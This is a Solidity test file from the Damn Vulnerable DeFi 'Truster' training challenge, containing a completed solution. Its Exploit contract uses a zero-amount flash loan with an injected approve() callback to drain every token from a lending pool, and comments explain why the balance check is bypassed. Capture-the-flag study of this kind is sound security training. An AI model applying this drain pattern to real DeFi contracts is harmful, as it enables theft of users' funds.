// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {TrusterLenderPool} from "../../src/truster/TrusterLenderPool.sol";

contract TrusterChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant TOKENS_IN_POOL = 1_000_000e18;

    DamnValuableToken public token;
    TrusterLenderPool public pool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        // Deploy token
        token = new DamnValuableToken();

        // Deploy pool and fund it
        pool = new TrusterLenderPool(token);
        token.transfer(address(pool), TOKENS_IN_POOL);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(address(pool.token()), address(token));
        assertEq(token.balanceOf(address(pool)), TOKENS_IN_POOL);
        assertEq(token.balanceOf(player), 0);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_truster() public checkSolvedByPlayer {
        new Exploit(address(pool), address(token), address(recovery));
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player must have executed a single transaction
        assertEq(vm.getNonce(player), 1, "Player executed more than one tx");

        // All rescued funds sent to recovery account
        assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
        assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
    }
}

contract Exploit {
    uint256 internal constant TOKENS_IN_POOL = 1_000_000e18;

    constructor(address _pool, address _token, address recoveryAddress) payable {
        TrusterLenderPool pool = TrusterLenderPool(_pool);
        /**
         * The data parameter for the flashLoan call encodes a call to the approve function of the DamnValuableToken contract.
         * It approves the Exploit contract to transfer up to 1 million DVT tokens from the pool to any address.
         */
        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), TOKENS_IN_POOL);
        /**
         * The exploit begins by requesting a flash loan for 0 tokens.
         * This means that no tokens are actually transferred out of the pool to the borrower at the beginning of the transaction.
         * Consequently, the token transfer operation doesn't change the pool's balance because amount is zero.
         */
        pool.flashLoan(0, address(this), _token, data);

        // Transfer all tokens from the pool to the recovery address.
        DamnValuableToken token = DamnValuableToken(_token);
        token.transferFrom(_pool, address(recoveryAddress), TOKENS_IN_POOL);
        /**
         * Why this code doesn't revert?
         *
         * if (token.balanceOf(address(this)) < balanceBefore) {
         *      revert RepayFailed();
         * }
         *
         * The exploit requests a flash loan for zero tokens,
         * meaning no tokens are initially transferred out of the pool,
         * keeping the pool's balance unchanged at the time of the balance check.
         *
         * After the flash loan's internal balance check,
         * the approved tokens are transferred out of the pool using transferFrom.
         * This happens after the flash loan function has verified that the initial token balance hasn't decreased.
         *
         * The key to why it doesn't revert lies in the timing:
         * the balance is checked before any tokens are actually moved out of the pool, and the actual transfer occurs after this check, bypassing the safeguard meant to ensure all borrowed tokens are returned within the transaction.
         */
        
    }
}
